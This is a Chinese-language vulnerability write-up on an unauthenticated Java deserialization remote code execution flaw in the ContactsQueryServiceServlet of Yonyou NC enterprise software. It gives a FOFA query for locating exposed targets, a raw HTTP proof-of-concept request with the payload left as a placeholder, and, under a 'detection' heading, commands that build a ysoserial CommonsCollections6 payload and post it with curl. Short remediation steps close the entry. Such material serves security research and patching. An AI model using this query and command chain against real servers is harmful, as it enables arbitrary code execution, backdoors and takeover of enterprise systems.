# 用友NC ContactsQueryServiceServlet 反序列化代码执行RCE漏洞

## 漏洞信息

| 项目 | 内容 |
|------|------|
| 漏洞名称 | 用友NC ContactsQueryServiceServlet 反序列化代码执行RCE漏洞 |
| 漏洞类型 | RCE / Java反序列化 |
| 组件 | 用友NC ContactsQueryServiceServlet |
| 影响版本 | 用友NC |

## 漏洞概述

用友NC是企业管理软件，涵盖财务、供应链、生产制造等多个业务领域。ContactsQueryServiceServlet组件存在反序列化漏洞，该Servlet在处理用户请求时，对接收到的序列化数据未进行安全检查，直接进行反序列化操作。未经身份认证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限。

## 测绘语法

### FOFA
```sql
app="用友-UFIDA-NC"
```

## POC

### 原始请求包

```http
POST /servlet/ContactsQueryServiceServlet?pageId=login HTTP/1.1
Host: target
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
Content-Type: application/x-java-serialized-object
X-Authorization: echo
Content-Length: 10239

[Java序列化payload]
```

### 漏洞特征

- 请求路径: `/servlet/ContactsQueryServiceServlet`
- 请求参数: `pageId=login`
- Content-Type: `application/x-java-serialized-object`
- X-Authorization: `echo`
- 响应特征: HTTP 200

### 检测方法

```bash
# 使用ysoserial生成payload
java -jar ysoserial.jar CommonsCollections6 "命令" > payload.ser

# 发送payload
curl -X POST "http://target/servlet/ContactsQueryServiceServlet?pageId=login" \
  -H "Content-Type: application/x-java-serialized-object" \
  -H "X-Authorization: echo" \
  --data-binary @payload.ser
```

## 漏洞修复

1. 联系厂商打补丁或升级版本
2. 增加Web应用防火墙防护
3. 关闭互联网暴露面或接口设置访问权限

---

**来源**: 实战安全研究 (2026-03-24)